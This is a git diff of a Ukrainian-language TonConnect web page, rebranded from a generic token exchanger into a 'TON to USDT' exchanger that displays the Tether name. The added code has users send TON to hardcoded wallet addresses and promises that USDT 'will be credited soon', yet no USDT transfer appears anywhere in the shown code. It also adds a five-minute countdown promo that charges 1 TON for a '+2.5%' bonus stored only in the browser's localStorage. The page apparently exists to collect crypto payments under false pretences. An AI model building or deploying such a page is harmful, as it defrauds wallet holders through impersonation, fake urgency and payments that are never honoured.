@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Обмін TON на токени</title>
+    <title>Обмінник TON на USDT</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * {
@@ -18,9 +18,6 @@
             color: #fff;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
         }
         
@@ -29,10 +26,94 @@
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 40px;
-            width: 100%;
-            max-width: 500px;
+            width: 70%;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             text-align: center;
+            position: relative;
+        }
+        
+        .promo-sidebar {
+            width: 30%;
+            margin-left: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .promo-header {
+            background: linear-gradient(135deg, #ff6b6b, #ff9e6b);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .promo-header h2 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .promo-timer {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .timer-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ff9e6b;
+            margin: 10px 0;
+        }
+        
+        .promo-benefits {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .benefit-icon {
+            width: 30px;
+            height: 30px;
+            background: #fdbb2d;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .get-promo-btn {
+            background: linear-gradient(to right, #ff6b6b, #ff9e6b);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: auto;
+        }
+        
+        .get-promo-btn:hover {
+            background: linear-gradient(to right, #ff5252, #ff8a50);
+            transform: translateY(-2px);
         }
         
         h1 {
@@ -41,8 +122,19 @@
             color: #fdbb2d;
         }
         
+        .description {
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            color: #ccc;
+        }
+        
         .exchange-container {
             margin: 30px 0;
+            border: 2px solid #444;
+            border-radius: 15px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
         }
         
         .input-group {
@@ -54,6 +146,7 @@
             display: block;
             margin-bottom: 8px;
             font-weight: bold;
+            color: #fdbb2d;
         }
         
         .input-field {
@@ -76,6 +169,15 @@
             font-size: 2rem;
             margin: 15px 0;
             color: #fdbb2d;
+        }
+        
+        .discount-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            margin-left: 10px;
         }
         
         .button-group {
@@ -171,18 +273,66 @@
             border-radius: 8px;
             background: rgba(255, 255, 255, 0.1);
         }
+        
+        .steps {
+            margin-top: 30px;
+            text-align: left;
+        }
+        
+        .steps h3 {
+            color: #fdbb2d;
+            margin-bottom: 15px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        
+        .step-number {
+            background: #007bff;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .step-text {
+            flex: 1;
+        }
+        
+        .discount-active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(40, 167, 69, 0.2);
+            border-radius: 8px;
+            color: #8aff9b;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Обмін TON на токени</h1>
+        <h1>🔁 Обмінник TON на USDT</h1>
+        
+        <div class="description">
+            Обміняйте ваші TON на USDT (Tether) за фіксованим курсом. Швидко, зручно та безпечно.
+        </div>
         
         <div class="token-info">
-            <h3>Ваш токен: <span id="token-name">MyToken</span> (<span id="token-symbol">MTK</span>)</h3>
-            <p>Курс: 1 токен = 1 USDT</p>
+            <h3>Токен: <span id="token-name">Tether USDT</span> (<span id="token-symbol">USD₮</span>)</h3>
             <div class="price-info">
+                <p>Курс: 1 USDT = 1 USDT</p>
                 <p>Поточний курс TON: <span id="ton-price">2.50</span> USDT</p>
-                <p>1 TON = <span id="tokens-per-ton">2.5</span> токенів</p>
+                <p>1 TON = <span id="tokens-per-ton">2.5</span> USDT</p>
             </div>
         </div>
         
@@ -195,9 +345,16 @@
             <div class="conversion-arrow">↓</div>
             
             <div class="input-group">
-                <label for="token-amount">Ви отримаєте токенів:</label>
+                <label for="token-amount">Ви отримаєте USDT: <span id="discount-badge" class="discount-badge" style="display: none;">+2.5%</span></label>
                 <input type="text" id="token-amount" class="input-field" readonly value="2.5">
             </div>
+        </div>
+        
+        <div id="discount-active" class="discount-active" style="display: none;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="#8aff9b" stroke-width="2"/>
+            </svg>
+            <span style="margin-left: 10px;">Акційна знижка 2.5% активна! Залишилось: <span id="discount-timer">05:00</span></span>
         </div>
         
         <div class="button-group">
@@ -225,22 +382,87 @@
         
         <div id="status" class="status"></div>
         
+        <div class="steps">
+            <h3>Як це працює:</h3>
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">Підключіть ваш TON гаманець</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">Введіть кількість TON, яку хочете обміняти</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">Підтвердіть транзакцію у вашому гаманці</div>
+            </div>
+            <div class="step">
+                <div class="step-number">4</div>
+                <div class="step-text">Отримайте USDT на ваш гаманець</div>
+            </div>
+        </div>
+        
         <div class="rate-info">
             <p>Комісія мережі: 0.05 TON</p>
         </div>
     </div>
 
+    <div class="promo-sidebar">
+        <div class="promo-header">
+            <h2>🚀 Акційна пропозиція</h2>
+            <p>Отримайте +2.5% до обміну!</p>
+        </div>
+        
+        <div class="promo-timer">
+            <h3>Акція діє:</h3>
+            <div class="timer-value" id="promo-timer">05:00</div>
+            <p>після активації</p>
+        </div>
+        
+        <div class="promo-benefits">
+            <h3>Переваги акції:</h3>
+            <div class="benefit-item">
+                <div class="benefit-icon">+</div>
+                <div>Додаткові 2.5% USDT при обміні</div>
+            </div>
+            <div class="benefit-item">
+                <div class="benefit-icon">⚡</div>
+                <div>Миттєва активація</div>
+            </div>
+            <div class="benefit-item">
+                <div class="benefit-icon">🕒</div>
+                <div>Діє 5 хвилин після оплати</div>
+            </div>
+            <div class="benefit-item">
+                <div class="benefit-icon">💎</div>
+                <div>Ексклюзивна пропозиція</div>
+            </div>
+        </div>
+        
+        <button class="get-promo-btn" id="get-promo-btn">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            Отримати за 1 TON
+        </button>
+    </div>
+
     <script>
-        // Конфігурація вашого токена - ЗАМІНИТИ на реальні дані
+        // Конфігурація вашого токена
         const TOKEN_CONFIG = {
-            name: "Tether USDT",           // Назва вашого токена
-            symbol: "USD",             // Символ токена (3-5 символів)
-            masterAddress: "EQArTC3-SX8PACBjyYXfpOONA_TE0_1fWScSU9LuMe_nJxTx",    // Адреса Jetton Master контракту
-            decimals: 9                // Кількість десяткових знаків
+            name: "Tether USDT",
+            symbol: "USD₮",
+            masterAddress: "EQArTC3-SX8PACBjyYXfpOONA_TE0_1fWScSU9LuMe_nJxTx",
+            decimals: 9
         };
         
-        // Поточний курс TON до USDT (можна оновити вручну або отримувати з API)
+        // Поточний курс TON до USDT
         let tonPriceInUSDT = 2.50;
+        
+        // Змінні для акційної пропозиції
+        let discountActive = false;
+        let discountEndTime = 0;
+        let discountTimerInterval = null;
         
         // Ініціалізація TonConnect
         const manifestUrl = 'https://max225777.github.io/ton-payment-site/tonconnect-manifest.json';
@@ -259,6 +481,11 @@
         const tokenSymbolEl = document.getElementById('token-symbol');
         const tonPriceEl = document.getElementById('ton-price');
         const tokensPerTonEl = document.getElementById('tokens-per-ton');
+        const discountBadge = document.getElementById('discount-badge');
+        const discountActiveEl = document.getElementById('discount-active');
+        const discountTimerEl = document.getElementById('discount-timer');
+        const getPromoBtn = document.getElementById('get-promo-btn');
+        const promoTimerEl = document.getElementById('promo-timer');
         
         // Оновлення інформації про токен
         tokenNameEl.textContent = TOKEN_CONFIG.name;
@@ -266,12 +493,21 @@
         tonPriceEl.textContent = tonPriceInUSDT.toFixed(2);
         tokensPerTonEl.textContent = tonPriceInUSDT.toFixed(2);
         
+        // Перевірка наявності активної знижки при завантаженні сторінки
+        checkDiscountStatus();
+        
         // Розрахунок кількості токенів при зміні TON
         tonAmountInput.addEventListener('input', calculateTokens);
         
         function calculateTokens() {
             const tonAmount = parseFloat(tonAmountInput.value) || 0;
-            const tokenAmount = tonAmount * tonPriceInUSDT;
+            let tokenAmount = tonAmount * tonPriceInUSDT;
+            
+            // Застосовуємо знижку, якщо вона активна
+            if (discountActive) {
+                tokenAmount *= 1.025; // +2.5%
+            }
+            
             tokenAmountInput.value = tokenAmount.toFixed(TOKEN_CONFIG.decimals);
             
             // Активація кнопки обміну, якщо введено коректну суму
@@ -349,7 +585,7 @@
                 // Відправляємо транзакцію
                 const result = await tonConnectUI.sendTransaction(transaction);
                 
-                showStatus(`Успішно! ${tonAmount} TON відправлено. Токени будуть зараховані найближчим часом.`, "success");
+                showStatus(`Успішно! ${tonAmount} TON відправлено. USDT будуть зараховані найближчим часом.`, "success");
                 console.log("Transaction result:", result);
                 
                 // Очищаємо поля після успішного обміну
@@ -370,6 +606,132 @@
             }
         });
         
+        // Обробка кнопки отримання акційної пропозиції
+        getPromoBtn.addEventListener('click', async () => {
+            try {
+                getPromoBtn.disabled = true;
+                getPromoBtn.textContent = "Відправка 1 TON...";
+                
+                // Транзакція для активації знижки
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600, // 10 хвилин
+                    messages: [
+                        {
+                            // ЗАМІНИТИ на вашу TON-адресу для отримання коштів
+                            address: "UQDYSduMmfE6sBBBhvTR1wGtTG0_hmsj_xRaIg7P_W6-Pv1y",
+                            amount: "1000000000" // 1 TON в наноТОН
+                        }
+                    ]
+                };
+                
+                // Відправляємо транзакцію
+                const result = await tonConnectUI.sendTransaction(transaction);
+                
+                // Активуємо знижку на 5 хвилин
+                activateDiscount(5 * 60); // 5 хвилин у секундах
+                
+                showStatus("Акційну пропозицію активовано! Знижка 2.5% діє 5 хвилин.", "success");
+                
+            } catch (error) {
+                console.error("Помилка транзакції:", error);
+                
+                if (error?.message?.includes("User rejection")) {
+                    showStatus("Транзакцію скасовано", "error");
+                } else {
+                    showStatus("Помилка при активації пропозиції", "error");
+                }
+                
+                getPromoBtn.disabled = false;
+                getPromoBtn.textContent = "Отримати за 1 TON";
+            }
+        });
+        
+        // Функція активації знижки
+        function activateDiscount(duration) {
+            discountActive = true;
+            discountEndTime = Math.floor(Date.now() / 1000) + duration;
+            
+            // Зберігаємо в localStorage
+            localStorage.setItem('discountEndTime', discountEndTime.toString());
+            
+            // Оновлюємо відображення
+            updateDiscountDisplay();
+            
+            // Запускаємо таймер
+            if (discountTimerInterval) {
+                clearInterval(discountTimerInterval);
+            }
+            
+            discountTimerInterval = setInterval(updateDiscountTimer, 1000);
+            
+            // Перераховуємо кількість токенів з урахуванням знижки
+            calculateTokens();
+        }
+        
+        // Перевірка статусу знижки при завантаженні сторінки
+        function checkDiscountStatus() {
+            const savedEndTime = localStorage.getItem('discountEndTime');
+            
+            if (savedEndTime) {
+                const currentTime = Math.floor(Date.now() / 1000);
+                const remainingTime = parseInt(savedEndTime) - currentTime;
+                
+                if (remainingTime > 0) {
+                    activateDiscount(remainingTime);
+                } else {
+                    // Видаляємо прострочений запис
+                    localStorage.removeItem('discountEndTime');
+                }
+            }
+        }
+        
+        // Оновлення таймера знижки
+        function updateDiscountTimer() {
+            const currentTime = Math.floor(Date.now() / 1000);
+            const remainingTime = discountEndTime - currentTime;
+            
+            if (remainingTime <= 0) {
+                // Знижка закінчилася
+                discountActive = false;
+                clearInterval(discountTimerInterval);
+                discountTimerInterval = null;
+                localStorage.removeItem('discountEndTime');
+                
+                // Оновлюємо відображення
+                updateDiscountDisplay();
+                
+                // Перераховуємо кількість токенів без знижки
+                calculateTokens();
+                
+                return;
+            }
+            
+            // Оновлюємо таймер
+            const minutes = Math.floor(remainingTime / 60);
+            const seconds = remainingTime % 60;
+            
+            discountTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            promoTimerEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Оновлення відображення статусу знижки
+        function updateDiscountDisplay() {
+            if (discountActive) {
+                discountBadge.style.display = "inline-block";
+                discountActiveEl.style.display = "flex";
+                getPromoBtn.textContent = "Акція активована";
+                getPromoBtn.disabled = true;
+                getPromoBtn.style.background = "linear-gradient(to right, #28a745, #20c997)";
+            } else {
+                discountBadge.style.display = "none";
+                discountActiveEl.style.display = "none";
+                getPromoBtn.textContent = "Отримати за 1 TON";
+                getPromoBtn.disabled = false;
+                getPromoBtn.style.background = "linear-gradient(to right, #ff6b6b, #ff9e6b)";
+                promoTimerEl.textContent = "05:00";
+            }
+        }
+        
         // Функція для відображення статусу
         function showStatus(message, type) {
             statusEl.textContent = message;
@@ -385,7 +747,7 @@
         // Перевіряємо стан підключення при завантаженні сторінки
         document.addEventListener('DOMContentLoaded', checkConnection);
         
-        // Оновлення курсу TON (можна викликати через API, зараз встановлено вручну)
+        // Оновлення курсу TON
         function updateTonPrice() {
             // Тут може бути код для отримання актуального курсу TON/USDT з API
             // Наприклад: fetch('https://api.binance.com/api/v3/ticker/price?symbol=TONUSDT')
@@ -401,3 +763,4 @@
     </script>
 </body>
 </html>
+
